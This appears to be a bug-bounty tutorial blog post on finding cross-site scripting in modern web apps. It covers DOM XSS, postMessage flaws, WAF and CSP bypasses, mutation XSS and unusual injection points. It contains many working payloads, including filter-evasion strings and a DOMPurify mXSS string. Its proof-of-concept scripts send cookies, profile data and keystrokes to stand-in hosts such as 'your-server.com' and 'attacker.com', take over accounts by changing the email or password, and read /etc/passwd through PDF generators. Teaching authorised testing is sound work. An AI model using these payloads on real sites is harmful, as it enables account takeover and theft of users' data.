---
layout: "@layouts/MarkdownLayout.astro"
title: "Finding XSS in Bug Bounties: Beyond alert(1)"
description: "Practical techniques for finding cross-site scripting in modern web apps where basic payloads get filtered, including DOM XSS, mutation XSS, and bypassing WAFs."
date: "2026-04-07"
---

XSS is the vulnerability class that people keep declaring dead, and it keeps paying out bounties. HackerOne's 2025 report listed it as the second most reported bug category. The reason is simple: every web application takes user input and renders it somewhere, and developers get the escaping wrong more often than they think.

But the XSS that earns money in 2026 is not `<script>alert(1)</script>` in a search box. That payload gets caught by every WAF, every framework's default escaping, and every browser's built-in protections. The XSS that pays is the kind you find in places nobody thought to check, using techniques that bypass the defenses everyone assumed were enough.

## Why basic XSS still pays

Before getting into advanced techniques, a reality check. Reflected XSS in a simple parameter still exists. I find it regularly on targets that:

- Have legacy sections of the site running older code alongside modern frameworks
- Use server-side rendering with manual HTML construction instead of template engines
- Implement their own search or filtering logic with inadequate output encoding
- Have error pages that reflect user input directly

If you have done good [recon](/learn/bug-bounty-recon-methodology) and found subdomains running older tech stacks, start with the basics. Test every input you can find with something like `"><img src=x onerror=alert(1)>` and see what sticks. Spend an hour on it. If nothing works, move on to the harder stuff below.

The rest of this article assumes the basics did not work and you need to go deeper.

## DOM XSS in single-page applications

Most modern web apps are SPAs built with React, Angular, Vue, or similar frameworks. These frameworks escape output by default, which prevents traditional reflected XSS. But they introduce a different attack surface: DOM-based XSS.

DOM XSS happens when JavaScript reads from a user-controllable source (like `location.hash`, `location.search`, or `document.referrer`) and writes it to a dangerous sink (like `innerHTML`, `document.write`, or `eval`). The payload never hits the server. It lives entirely in the browser.

### Finding DOM XSS sources

Open the browser devtools and search the JavaScript bundles for these patterns:

```javascript
// Dangerous sources - user-controlled input
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage
localStorage.getItem
sessionStorage.getItem
```

In React apps specifically, look for:

```jsx
// React's explicit opt-in to unsafe rendering
dangerouslySetInnerHTML={{__html: userInput}}

// URL-based XSS in href attributes
<a href={userControlledUrl}>Click here</a>
```

That `href` sink is one people miss constantly. If an app lets you set a URL that gets rendered in an anchor tag, you can inject `javascript:alert(document.cookie)` and it executes on click. React does not block this. Neither does Angular or Vue.

### Finding DOM XSS sinks

Search the JS bundles for dangerous sinks:

```javascript
// High-risk sinks
element.innerHTML = ...
element.outerHTML = ...
document.write(...)
document.writeln(...)
eval(...)
setTimeout(string, ...)
setInterval(string, ...)
new Function(string)
$.html(...)        // jQuery
v-html             // Vue directive
[innerHTML]        // Angular binding
```

The trick is tracing the data flow from source to sink. In a minified bundle, this is tedious. I use browser devtools to set breakpoints on the sinks and then modify URL parameters to see which inputs reach them.

### A real-world pattern

Here is a pattern I see often in SPAs. The app reads a `redirect` or `next` parameter from the URL and uses it after authentication:

```javascript
// After login, redirect the user
const params = new URLSearchParams(window.location.search);
const redirectUrl = params.get('redirect');
if (redirectUrl) {
  window.location.href = redirectUrl;
}
```

This is an open redirect, but it can become XSS if you use `javascript:` as the protocol:

```
https://target.com/login?redirect=javascript:alert(document.domain)
```

Some apps try to fix this by checking that the URL starts with `/`, but forget about protocol-relative URLs or the `javascript:` scheme with whitespace:

```
javascript%0a:alert(1)
```

### postMessage vulnerabilities

SPAs communicate between windows and iframes using `postMessage`. If an event listener does not validate the origin of incoming messages, you can inject payloads from your own page.

Look for patterns like:

```javascript
window.addEventListener('message', function(event) {
  // No origin check!
  document.getElementById('output').innerHTML = event.data.content;
});
```

To exploit this, host a page that sends a crafted message:

```html
<iframe src="https://target.com/vulnerable-page" id="target"></iframe>
<script>
  document.getElementById('target').onload = function() {
    this.contentWindow.postMessage(
      {content: '<img src=x onerror=alert(document.domain)>'},
      '*'
    );
  };
</script>
```

I have found this pattern in embedded widgets, chat integrations, and analytics dashboards. It is common because developers treat postMessage like a trusted internal API.

## Bypassing WAFs and filters

When you find an injection point but your payload gets blocked, the question becomes what exactly is being filtered. Is it a WAF at the network level? Application-level input validation? Output encoding? Each requires a different bypass strategy.

### Identifying the filter

First, figure out what is blocking you. Send payloads in stages:

1. `<` - is the angle bracket encoded?
2. `<img` - is the tag name blocked?
3. `<img src=x` - does the attribute pass?
4. `<img src=x onerror=` - is the event handler keyword blocked?
5. `<img src=x onerror=alert(1)>` - is the full payload blocked?

If step 1 fails, you are dealing with output encoding and the injection point is probably not exploitable through HTML injection. Look for JavaScript context injection instead.

If step 4 or 5 fails but earlier steps pass, you are likely hitting a WAF or keyword filter.

### WAF bypass techniques

WAFs pattern-match on known payloads. They are blocklists, which means anything not on the list gets through. Common bypasses:

**Case variation and encoding:**

```html
<IMG SRC=x OnErRoR=alert(1)>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061lert(1)>
```

**Uncommon tags and event handlers:**

WAFs tend to block `<script>`, `<img onerror>`, and `<svg onload>`. They are less likely to block:

```html
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
```

That last one is a mutation XSS (mXSS) payload. I will come back to that.

**Alternative JavaScript execution:**

If `alert` is blocked:

```html
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>
<img src=x onerror=window['al'+'ert'](1)>
<img src=x onerror=self[atob('YWxlcnQ=')](1)>
<img src=x onerror=top[8680439..toString(30)](1)>
```

That last trick uses the fact that `(8680439).toString(30)` evaluates to `"alert"`. Most WAFs will never pattern-match on that.

**Payload-less techniques:**

Sometimes you do not even need JavaScript execution. If you can inject HTML, you can do:

```html
<form action="https://attacker.com/steal">
  <input name="token" type="hidden">
  <button>Click to continue</button>
</form>
```

This overwrites a form on the page and sends whatever data was in the original form to your server. Depending on context, this can steal CSRF tokens or credentials.

### Bypassing CSP

[Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is the strongest browser-side defense against XSS. When it works, even a successful injection cannot execute JavaScript because the browser refuses to run inline scripts or scripts from unauthorized origins.

But CSP is hard to configure correctly. Here is what to look for.

**Check the policy first:**

Look at the `Content-Security-Policy` response header. Common weaknesses:

```
# Unsafe - allows inline scripts
script-src 'unsafe-inline'

# Unsafe - allows eval() and friends
script-src 'unsafe-eval'

# Overly broad - any script from these CDNs
script-src https://cdnjs.cloudflare.com https://cdn.jsdelivr.net

# Missing - no script-src falls back to default-src
default-src 'self'
```

**CDN-based bypasses:**

If the CSP allows scripts from a major CDN, you can often find a library on that CDN that lets you execute arbitrary code. Angular is the classic example:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

This works because Angular's template expressions can evaluate arbitrary JavaScript, and the script loads from an allowed CDN origin. The [PortSwigger CSP bypass collection](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) maintains a list of known bypasses for specific CSP configurations.

**JSONP endpoints on allowed domains:**

If the CSP allows scripts from a domain that has a JSONP endpoint, you can use it as a script gadget:

```html
<script src="https://allowed-domain.com/jsonp?callback=alert(1)//"></script>
```

The JSONP endpoint returns `alert(1)//({"data": ...})`, which executes your payload.

**base-uri missing:**

If the CSP does not restrict `base-uri`, you can inject a `<base>` tag that changes the base URL for all relative script paths:

```html
<base href="https://attacker.com/">
```

Now every `<script src="/app.js">` on the page loads from your server instead.

## Mutation XSS

Mutation XSS (mXSS) is one of the more interesting XSS classes. It exploits differences between how HTML sanitizers parse markup and how the browser actually renders it.

The idea: you craft HTML that looks safe to the sanitizer but mutates into something dangerous when the browser processes it. This happens because browsers "fix" malformed HTML in ways the sanitizer did not predict.

A classic mXSS example against DOMPurify (patched in later versions):

```html
<math><mtext><table><mglyph><svg><mtext>
<style><path id="</style><img onerror=alert(1) src>">
```

The sanitizer sees the `<img>` tag inside a `<style>` element, where it is treated as text, not as an HTML tag. But when the browser renders this nested structure with math and SVG namespace switching, it re-parses the content and the `<img>` tag becomes a real element that fires its `onerror` handler.

To find mXSS opportunities, look for applications that:

- Use client-side HTML sanitization (DOMPurify, sanitize-html, Angular's sanitizer)
- Allow rich text input (WYSIWYG editors, markdown renderers, email composers)
- Render HTML from APIs that do server-side sanitization

Feed these inputs nested combinations of HTML, SVG, and MathML namespaces. The namespace boundaries are where browsers and sanitizers most often disagree on how to parse the markup.

## From XSS to impact

Finding the injection is half the work. The other half is demonstrating impact that convinces the triager to rate it as high or critical severity. This is the difference between a $150 payout and a $5,000 payout.

Never submit a report that just says "I can execute alert(1)." Show what an attacker could actually do.

### Account takeover proof of concept

The highest impact XSS demo is full account takeover. If the session cookie does not have the `HttpOnly` flag:

```javascript
fetch('https://your-server.com/steal?c=' + document.cookie)
```

If cookies are `HttpOnly` (they usually are in 2026), you can still take over accounts by:

```javascript
// Change the user's email to yours, then do password reset
fetch('/api/account/settings', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
});
```

Or extract the CSRF token and then change the password:

```javascript
fetch('/account/settings').then(r => r.text()).then(html => {
  const token = html.match(/csrf_token" value="([^"]+)"/)[1];
  fetch('/account/change-password', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'csrf_token=' + token + '&new_password=pwned123',
    credentials: 'include'
  });
});
```

This demonstrates full account takeover without ever touching cookies. Include this in your report and you will get a higher severity rating.

### Data exfiltration

Show that you can read sensitive data:

```javascript
// Read the user's profile, including PII
fetch('/api/me', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    fetch('https://your-server.com/exfil', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
```

### Keylogging

For stored XSS, demonstrate persistence:

```javascript
document.addEventListener('keydown', function(e) {
  fetch('https://your-server.com/keys?k=' + e.key);
});
```

When you write your report, explain the full attack chain. If you need help structuring it, the guide on [writing your first report](/learn/writing-your-first-report) covers how to communicate severity effectively. Understanding [CVSS scoring](/learn/understanding-cvss-scoring-for-bounty-hunters) helps you frame the impact in terms triagers expect.

## XSS in unexpected places

The search box and comment field are where every hunter starts. The interesting XSS lives in places people do not think to test.

### Error pages

Custom error pages often reflect the URL path or a parameter value. Try:

```
https://target.com/<img src=x onerror=alert(1)>
https://target.com/nonexistent?page=<script>alert(1)</script>
```

404 and 500 error handlers are frequently written with less care than the main application. They might use a different template engine or skip the framework's default escaping.

### File names and metadata

Upload a file named `"><img src=x onerror=alert(1)>.png`. If the application displays the filename anywhere without encoding it, that is stored XSS. I have seen this work in file sharing platforms, project management tools, and cloud storage interfaces.

PDF metadata, EXIF data in images, and document properties can also carry XSS payloads if the app reads and displays them.

### Email rendering

If the application sends emails that include user-controlled content (like a "share this" feature or a notification that includes a message), and those emails render HTML, you might get XSS in the email client. This is especially impactful for webmail clients that render the email in the same origin as the mail application.

### SVG files

SVG is XML that can contain JavaScript:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

If an application allows SVG uploads and serves them with a `Content-Type: image/svg+xml` header from the same origin as the app, you have stored XSS. Many image upload features fail to check for script content inside SVGs.

### Markdown rendering

Applications that render user-supplied markdown sometimes allow HTML passthrough. Even if they strip `<script>` tags, they might miss:

```markdown
[Click me](javascript:alert(1))

![alt text](x" onerror="alert(1))
```

Some markdown parsers also have quirks with link processing that allow injection through crafted URLs.

### PDF generation

Applications that generate PDFs from user content (invoices, reports, tickets) sometimes use HTML-to-PDF converters like wkhtmltopdf or headless Chrome. If your input ends up in the HTML that gets converted, you can execute JavaScript in the context of the PDF generator, which often runs on the server. This can escalate from XSS to SSRF or local file read:

```javascript
<script>
  x = new XMLHttpRequest();
  x.open('GET', 'file:///etc/passwd');
  x.onload = function() {
    document.write(this.responseText);
  };
  x.send();
</script>
```

## Testing workflow

Here is the process I follow when testing a target for XSS after [recon](/learn/bug-bounty-recon-methodology) is done:

1. Map every input. Forms, URL parameters, headers the app reads (Referer, User-Agent), JSON API bodies, WebSocket messages, file uploads.
2. Check where each input gets reflected or stored. View source, inspect the DOM, check API responses.
3. Identify the context. Is your input inside an HTML tag, an attribute, a JavaScript string, a CSS value, or a URL? The context determines which payloads work.
4. Test the filter. Send incremental payloads to understand what gets blocked or encoded.
5. Try bypass techniques matched to the specific filter you identified.
6. If you get execution, build an impact PoC before reporting.

For the [source code review](/learn/reading-source-code-for-vulnerabilities) angle, search the codebase for dangerous sinks and trace data flow backward to find inputs that reach them without proper encoding.

## Resources

The [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) is the single best reference for payloads, organized by tag, event, and browser. Bookmark it.

For learning the fundamentals, [PortSwigger's XSS labs](https://portswigger.net/web-security/cross-site-scripting) are free and cover reflected, stored, and DOM-based XSS with increasing difficulty.

The [OWASP testing guide](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) covers the defensive side, which helps you understand what protections to look for and how they fail.

XSS is not going away. Frameworks keep adding default escaping, and developers keep finding ways to bypass it with `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, and raw template interpolation. The targets change, but the core problem - untrusted input reaching a rendering context without proper encoding - stays the same. Learn to find the spots where encoding fails, and you will always have bugs to report.
